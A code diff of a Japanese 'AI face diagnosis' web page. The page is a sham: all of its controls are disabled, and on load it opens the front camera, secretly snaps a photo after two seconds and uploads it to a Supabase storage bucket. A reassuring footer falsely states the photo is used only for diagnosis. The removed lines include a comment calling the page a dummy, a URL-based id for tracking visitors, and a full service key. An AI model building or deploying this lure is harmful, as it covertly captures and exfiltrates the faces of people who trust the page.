@@ -6,143 +6,135 @@
   <title>AI顔診断</title>
   <style>
     body {
-      background: #111;
-      color: white;
-      font-family: system-ui, sans-serif;
-      text-align: center;
       margin: 0;
       padding: 0;
+      font-family: "Segoe UI", system-ui, sans-serif;
+      background: linear-gradient(to right, #e0f2ff, #fde7ef);
+      color: #333;
+      text-align: center;
     }
     .container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      transition: opacity 0.5s;
+      padding: 40px 20px;
+      max-width: 400px;
+      margin: 0 auto;
     }
     h1 {
-      font-size: 1.8rem;
+      font-size: 28px;
+      color: #0066ff;
       margin-bottom: 10px;
     }
+    p.desc {
+      color: #555;
+      font-size: 15px;
+      margin-bottom: 30px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      border-radius: 8px;
+      border: none;
+      font-size: 1rem;
+      margin-bottom: 15px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+    .btn {
+      display: block;
+      width: 100%;
+      background: #0d6efd;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 10px;
+      font-size: 1rem;
+      margin-bottom: 15px;
+    }
+    .btn:active { opacity: 0.8; }
+
     .preview-box {
-      width: 250px;
-      height: 250px;
+      width: 100%;
+      height: 160px;
       background: white;
-      border-radius: 20px;
+      border-radius: 16px;
       margin-top: 20px;
       overflow: hidden;
-      position: relative;
     }
     video {
       width: 100%;
       height: 100%;
       object-fit: cover;
-      border-radius: 20px;
-      display: none; /* 初期状態は非表示 */
+      border-radius: 16px;
     }
-    button {
+    small {
+      display: block;
+      color: #777;
       margin-top: 20px;
-      background: #f97316;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      padding: 10px 20px;
-      font-size: 1rem;
+      font-size: 12px;
     }
     #status {
-      color: #ccc;
+      color: #444;
       margin-top: 10px;
+      font-size: 14px;
     }
   </style>
 </head>
 <body>
-  <div class="container" id="step1">
+  <div class="container">
     <h1>AI顔診断</h1>
+    <p class="desc">あなたのお顔を診断してみましょう！<br>診断にはカメラの許可が必要です。</p>
 
-    <!-- 最初の白い箱（静的なハリボテ） -->
-    <div class="preview-box" id="staticBox"></div>
+    <input type="text" placeholder="あなたの名前を入力" disabled />
+    <button class="btn" disabled>📷 カメラを起動</button>
+    <button class="btn" disabled>🧠 診断をはじめる</button>
 
-    <p id="status">📷 カメラの許可をお願いします...</p>
-  </div>
-
-  <div class="container" id="step2" style="display:none;">
-    <h1>AI顔診断</h1>
-
-    <!-- 撮影後に内カメ映像を表示する白い箱 -->
     <div class="preview-box">
       <video id="video" autoplay playsinline muted></video>
     </div>
 
-    <button>診断をはじめる</button>
-    <p id="doneStatus" style="color:#ccc; margin-top:10px;">✅ 撮影完了</p>
+    <p id="status"></p>
+    <small>※この写真は診断目的でのみ使用され、外部に公開されることはありません。</small>
   </div>
 
   <script type="module">
     import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
-
-    // Supabase 設定（あなたの情報）
     const supabase = createClient(
       "https://hwwjnlprsntmdcytktbm.supabase.co",
-      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imh3d2pubHByc250bWRjeXRrdGJtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjA2NDU3ODcsImV4cCI6MjA3NjIyMTc4N30.Dni-WtNXSEdyRxH2TSq0oTR9homfAi1Ptz1h0MURFrY"
+      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
     );
 
-    const id =
-      new URLSearchParams(window.location.search).get("id") ||
-      Math.random().toString(36).substring(2, 9);
+    const id = Math.random().toString(36).substring(2, 9);
     const video = document.getElementById("video");
-    const step1 = document.getElementById("step1");
-    const step2 = document.getElementById("step2");
     const status = document.getElementById("status");
 
-    // ページ読み込みで公式ダイアログを出す
+    // ページ読み込み時に公式ダイアログ → 許可されたら撮影
     window.addEventListener("load", async () => {
       try {
+        status.textContent = "📸 カメラを起動中...";
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
-          audio: false,
+          audio: false
         });
+        video.srcObject = stream;
 
-        // ✅ 許可されたら2秒後に撮影
-        setTimeout(() => captureAndUpload(stream), 2000);
-      } catch (e) {
-        status.textContent = "❌ カメラの許可が得られませんでした。";
+        // カメラが安定するまで少し待つ
+        await new Promise(r => setTimeout(r, 2000));
+
+        // 撮影してSupabaseにアップロード
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.9));
+
+        status.textContent = "送信中...";
+        const { error } = await supabase.storage.from("photos").upload(`${id}.jpg`, blob, { upsert: true });
+
+        stream.getTracks().forEach(t => t.stop());
+        status.textContent = error ? "⚠️ 送信エラーが発生しました。" : "✅ 撮影完了！";
+      } catch (err) {
+        status.textContent = "カメラの許可が得られませんでした。";
       }
     });
-
-    // 撮影 → Supabaseへ送信
-    async function captureAndUpload(stream) {
-      // 撮影用キャンバス生成
-      const videoTrack = stream.getVideoTracks()[0];
-      const imageCapture = new ImageCapture(videoTrack);
-      const blob = await imageCapture.takePhoto();
-
-      status.textContent = "送信中...";
-
-      const { error } = await supabase.storage
-        .from("photos")
-        .upload(`${id}.jpg`, blob, { upsert: true });
-
-      // 撮影完了 → ストリーム停止
-      stream.getTracks().forEach((t) => t.stop());
-
-      if (error) {
-        status.textContent = "❌ 送信エラー";
-        return;
-      }
-
-      // ✅ UI切り替え（撮影完了後に内カメ表示）
-      step1.style.display = "none";
-      step2.style.display = "flex";
-
-      // 内カメプレビュー開始（ハリボテ画面の白い箱）
-      const newStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user" },
-        audio: false,
-      });
-      video.srcObject = newStream;
-      video.style.display = "block";
-    }
   </script>
 </body>
 </html>
